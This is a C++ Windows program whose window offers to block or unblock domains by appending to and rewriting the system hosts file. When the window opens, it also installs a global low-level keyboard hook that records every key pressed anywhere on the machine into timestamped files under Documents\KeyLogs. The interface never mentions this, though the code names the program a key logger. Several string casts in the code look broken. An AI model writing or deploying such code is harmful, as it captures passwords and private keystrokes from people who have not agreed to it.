#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include <Shlobj.h>
#include <ctime>
#include <locale>
#include <codecvt>

HWND hwndBlockButton;
HWND hwndUnblockButton;
HWND hwndDomainInput;
HWND hwndIpAddressInput;
std::ofstream logFile;

bool AddHostEntry(const std::string& domain, const std::string& ipAddress)
{
    std::ofstream hostsFile(R"(C:\Windows\System32\drivers\etc\hosts)", std::ios_base::app);
    if (hostsFile.is_open())
    {
        hostsFile << ipAddress << " " << domain << std::endl;
        hostsFile.close();
        return true;
    }
    return false;
}

bool RemoveHostEntry(const std::string& domain, const std::string& ipAddress)
{
    std::ifstream input(R"(C:\Windows\System32\drivers\etc\hosts)");
    std::ofstream output(R"(C:\Windows\System32\drivers\etc\hosts_temp)");

    if (input.is_open() && output.is_open())
    {
        std::string line;
        while (std::getline(input, line))
        {
            if (line.find(ipAddress + " " + domain) == std::string::npos)
            {
                output << line << std::endl;
            }
        }

        input.close();
        output.close();

        std::remove(R"(C:\Windows\System32\drivers\etc\hosts)");
        std::rename(R"(C:\Windows\System32\drivers\etc\hosts_temp)", R"(C:\Windows\System32\drivers\etc\hosts)");

        return true;
    }

    return false;
}

LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        auto* pKeyboardStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD vkCode = pKeyboardStruct->vkCode;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
        {
            // Handle the key press
            logFile << "Key pressed: " << vkCode << std::endl;
        }
    }

    return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
        case WM_CREATE:
        {
            CreateWindow("STATIC", "Enter the domain and IP address to block/unblock:",
                         WS_VISIBLE | WS_CHILD,
                         20, 20, 360, 20,
                         hwnd, nullptr, nullptr, nullptr);

            hwndDomainInput = CreateWindow("EDIT", "",
                                           WS_VISIBLE | WS_CHILD | WS_BORDER,
                                           20, 50, 200, 30,
                                           hwnd, nullptr, nullptr, nullptr);

            hwndIpAddressInput = CreateWindow("EDIT", "",
                                              WS_VISIBLE | WS_CHILD | WS_BORDER,
                                              20, 90, 200, 30,
                                              hwnd, nullptr, nullptr, nullptr);

            hwndBlockButton = CreateWindow("BUTTON", "Block",
                                           WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                           20, 130, 150, 30,
                                           hwnd, nullptr, nullptr, nullptr);

            hwndUnblockButton = CreateWindow("BUTTON", "Unblock",
                                             WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                             200, 130, 150, 30,
                                             hwnd, nullptr, nullptr, nullptr);

            auto hInstance = reinterpret_cast<HINSTANCE>(GetWindowLongPtr(hwnd, GWLP_HINSTANCE));

            // Install the keyboard hook
            HHOOK hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, hInstance, 0);
            if (hKeyboardHook == nullptr)
            {
                MessageBox(hwnd, "Failed to install the keyboard hook.", "Error", MB_OK | MB_ICONERROR);
            }
            else
            {
                // Store the hook handle in the window user data
                SetWindowLongPtr(hwnd, GWLP_USERDATA, reinterpret_cast<LONG_PTR>(hKeyboardHook));
            }

            // Create the KeyLogs folder under the Documents folder
            PWSTR documentsPath;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Documents, 0, nullptr, &documentsPath)))
            {
                std::wstring keyLogsFolder = std::wstring(documentsPath) + L"\\KeyLogs";
                CreateDirectory(reinterpret_cast<LPCSTR>(keyLogsFolder.c_str()), nullptr);

                // Generate a unique file name using timestamp
                std::time_t now = std::time(nullptr);
                std::tm* timeInfo = std::localtime(&now);
                char timestamp[20];
                std::strftime(timestamp, sizeof(timestamp), "%Y%m%d%H%M%S",timeInfo);

                std::string logFileName = "LOG_" + std::string(timestamp) + ".txt";

                std::wstring logFilePath = keyLogsFolder + L"\\" + std::wstring(logFileName.begin(), logFileName.end());

                std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
                std::string logFilePathUtf8 = converter.to_bytes(logFilePath);

                logFile.open(logFilePathUtf8, std::ios_base::app);

                CoTaskMemFree(documentsPath);
            }
        }
            break;

        case WM_COMMAND:
        {
            if (reinterpret_cast<HWND>(lParam) == hwndBlockButton)
            {
                // Handle the block button click
                const int bufferSize = 256;
                wchar_t domainBuffer[bufferSize];
                wchar_t ipAddressBuffer[bufferSize];

                GetWindowTextW(hwndDomainInput, domainBuffer, bufferSize);
                GetWindowTextW(hwndIpAddressInput, ipAddressBuffer, bufferSize);

                std::wstring domain(domainBuffer);
                std::wstring ipAddress(ipAddressBuffer);

                std::string domainUtf8(domain.begin(), domain.end());
                std::string ipAddressUtf8(ipAddress.begin(), ipAddress.end());

                if (AddHostEntry(domainUtf8, ipAddressUtf8))
                {
                    MessageBox(hwnd, "Host entry added successfully.", "Success", MB_OK | MB_ICONINFORMATION);
                }
                else
                {
                    MessageBox(hwnd, "Failed to add the host entry.", "Error", MB_OK | MB_ICONERROR);
                }
            }
            else if (reinterpret_cast<HWND>(lParam) == hwndUnblockButton)
            {
                // Handle the unblock button click
                const int bufferSize = 256;
                wchar_t domainBuffer[bufferSize];
                wchar_t ipAddressBuffer[bufferSize];

                GetWindowTextW(hwndDomainInput, domainBuffer, bufferSize);
                GetWindowTextW(hwndIpAddressInput, ipAddressBuffer, bufferSize);

                std::wstring domain(domainBuffer);
                std::wstring ipAddress(ipAddressBuffer);

                std::string domainUtf8(domain.begin(), domain.end());
                std::string ipAddressUtf8(ipAddress.begin(), ipAddress.end());

                if (RemoveHostEntry(domainUtf8, ipAddressUtf8))
                {
                    MessageBox(hwnd, "Host entry removed successfully.", "Success", MB_OK | MB_ICONINFORMATION);
                }
                else
                {
                    MessageBox(hwnd, "Failed to remove the host entry.", "Error", MB_OK | MB_ICONERROR);
                }
            }
        }
            break;

        case WM_CLOSE:
        {
            // Clean up resources and close the log file
            auto hKeyboardHook = reinterpret_cast<HHOOK>(GetWindowLongPtr(hwnd, GWLP_USERDATA));
            if (hKeyboardHook != nullptr)
            {
                UnhookWindowsHookEx(hKeyboardHook);
            }

            logFile.close();

            DestroyWindow(hwnd);
        }
            break;

        case WM_DESTROY:
            PostQuitMessage(0);
            break;

        default:
            return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }

    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    const wchar_t CLASS_NAME[] = L"KeyLogger";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = reinterpret_cast<LPCSTR>(CLASS_NAME);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(
            0,                              // Optional window styles.
            reinterpret_cast<LPCSTR>(CLASS_NAME),                     // Window class
            reinterpret_cast<LPCSTR>(L"Key Logger"),                  // Window text
            WS_OVERLAPPEDWINDOW,            // Window style

            // Size and position
            CW_USEDEFAULT, CW_USEDEFAULT, 400, 250,

            nullptr,       // Parent window
            nullptr,       // Menu
            hInstance,  // Instance handle
            nullptr        // Additional application data
    );

    if (hwnd == nullptr)
    {
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);

    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}